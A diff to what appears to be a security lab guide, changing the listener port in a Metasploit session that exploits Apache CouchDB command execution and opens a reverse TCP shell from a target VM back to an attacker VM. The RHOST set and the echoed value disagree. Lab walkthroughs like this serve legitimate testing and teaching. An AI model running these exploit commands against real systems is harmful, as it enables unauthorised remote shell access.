@@ -168,8 +168,8 @@ msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 192.168.20.101
 RHOST => 192.168.20.100
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LHOST 10.114.209.151
 LHOST => 10.114.209.151
-msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LPORT 4445
-LPORT => 4445
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LPORT 4446
+LPORT => 4446
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
 ```
 2. Confirm the vulnerable server was sucessfully exploited and a **shell** reverse TCP session was established from **App2-APP-TIER VM** back to the **Extermal VM**
